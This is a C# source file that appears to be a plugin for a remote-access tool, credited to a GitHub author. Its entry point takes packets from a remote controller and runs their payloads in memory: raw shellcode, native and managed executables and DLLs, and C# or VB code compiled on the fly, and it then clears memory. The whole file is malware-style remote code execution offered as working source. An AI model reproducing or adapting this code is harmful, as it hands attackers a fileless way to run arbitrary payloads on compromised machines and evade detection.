using Microsoft.CSharp;
using Microsoft.VisualBasic;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            MemoryExecutionPacket memoryExecutionPacket;
            byte[] decompressed;
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.MEM_EXEC_SHELLCODE:
                    memoryExecutionPacket = (MemoryExecutionPacket)loadingAPI.currentPacket;
                    decompressed = Compressor.QuickLZ.Decompress(memoryExecutionPacket.payload);
                    ShellCode.RunShellCode(decompressed);
                    break;

                case PacketType.MEM_EXEC_NATIVE_PE:
                    memoryExecutionPacket = (MemoryExecutionPacket)loadingAPI.currentPacket;
                    decompressed = Compressor.QuickLZ.Decompress(memoryExecutionPacket.payload);
                    NativePE.LoadPE(decompressed);
                    break;

                case PacketType.MEM_EXEC_NATIVE_DLL:
                    memoryExecutionPacket = (MemoryExecutionPacket)loadingAPI.currentPacket;
                    decompressed = Compressor.QuickLZ.Decompress(memoryExecutionPacket.payload);
                    NativeDll.LoadDll(decompressed);
                    break;

                case PacketType.MEM_EXEC_MANAGED_DLL:
                    memoryExecutionPacket = (MemoryExecutionPacket)loadingAPI.currentPacket;
                    decompressed = Compressor.QuickLZ.Decompress(memoryExecutionPacket.payload);
                    ManagedDll.LoadDll(decompressed, memoryExecutionPacket.managedEntryPoint);
                    break;

                case PacketType.MEM_EXEC_MANAGED_PE:
                    memoryExecutionPacket = (MemoryExecutionPacket)loadingAPI.currentPacket;
                    decompressed = Compressor.QuickLZ.Decompress(memoryExecutionPacket.payload);
                    ManagedExe.LoadExe(decompressed);
                    break;

                case PacketType.MEM_EXEC_CSHARP_CODE:
                    DotNetCode.Compiler(new CSharpCodeProvider(new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" } }), ((RemoteCodeExecution)loadingAPI.currentPacket).code, string.Join(",", ((RemoteCodeExecution)loadingAPI.currentPacket).references).Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries), ((RemoteCodeExecution)loadingAPI.currentPacket).compilerOptions);
                    break;

                case PacketType.MEM_EXEC_VB_CODE:
                    DotNetCode.Compiler(new VBCodeProvider(new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" } }), ((RemoteCodeExecution)loadingAPI.currentPacket).code, string.Join(",", ((RemoteCodeExecution)loadingAPI.currentPacket).references).Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries), ((RemoteCodeExecution)loadingAPI.currentPacket).compilerOptions);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
